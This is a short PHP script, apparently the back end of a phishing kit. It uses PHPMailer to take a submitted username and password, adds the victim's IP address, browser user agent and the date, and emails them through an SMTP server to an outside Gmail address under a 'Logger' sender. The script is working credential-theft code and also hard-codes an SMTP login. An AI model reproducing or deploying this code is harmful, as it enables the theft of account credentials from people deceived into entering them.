<?php
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    $ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$x1 = $_REQUEST['x1'] ;
$x2 = $_REQUEST['x2'] ;

    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'mail.summerxs.xyz';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'sub@summerxs.xyz';                     // SMTP username
    $mail->Password   = 'MUCHMONEY@QQ';                               // SMTP password
    //$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
    $mail->setFrom('sub@summerxs.xyz', 'Logger');
    $mail->addAddress('ameliabarbara33@gmail.com', 'WE New User');     // Add a recipient

    $mail->addReplyTo('sub@summerxs.xyz', 'Information');



    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'New Contact';
    $mail->Body    = "------------ADAMX--------------

<br>
Username : $x1<br>
Password : $x2<br>
IP:$ip<br>
----------------------------------------------------<br>
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."<br>
DATE : $datamasii"; 
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}